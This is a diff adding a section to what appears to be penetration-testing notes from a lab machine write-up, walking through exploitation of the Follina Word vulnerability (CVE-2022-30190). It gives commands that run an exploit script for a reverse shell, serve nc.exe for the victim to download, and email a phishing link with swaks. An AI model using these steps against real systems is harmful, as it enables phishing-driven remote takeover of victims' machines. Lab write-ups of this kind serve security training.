@@ -58,6 +58,23 @@ john protected-docx.hash --show</code></pre>
 
             </ul>
 
+            <h2>Word</h2>
+            <ul>
+                <h3>Follina CVE-2022-30190</h3>
+                <ul>
+                    <p>"Follina" is the nickname for a critical remote code execution (RCE) vulnerability in Microsoft Windows, officially tracked as CVE-2022-30190. It was first publicly discovered in late May 2022 and allows attackers to take control of a target system by tricking users into opening a specially crafted document, often through phishing campaigns.</p>
+                    <p>In order to exploit this we could use the <a class="notion-link" href="https://github.com/JohnHammond/msdt-follina">following github repository</a></p>
+                    <p>Clone the repo and execute the follina.py using the following. In this case we are serving the malicious word document in our localhost port 80 </p>
+                    <pre><code class="language-bash">python3 follina.py --interface tun0 --port 80 --reverse 4444</code></pre>
+                    <p>If we look at the code of follina.py we'll see that once the document is clicked the victim will perform a connection to our malicious server using the port 8000 <b>(Modify this as you whish)</b></p>
+                    <p>Open a web server to serve the nc.exe file which the victim will be looking for in the request once the document was opened</p>
+                    <pre><code class="language-bash">python3 -m http.server 8000</code></pre>
+                    <p>In this case in order to deliver the document we emailed the victim but there are a lot of methods to transfer the malicious doc to the victm and make it click</p>
+                    <pre><code class="language-bash">swaks --to itsupport@outdated.htb --from car@melo --server mail.outdated.htb --body "http://10.10.14.5/"</code></pre>
+                    <p><b>Newer versions of windows are already patches so there is no need to fear to that unless you are running some old server or workstation and you have not installed the cummulatives updates</b></p>
+                </ul>
+            </ul>
+
             
         </div>
     </div>
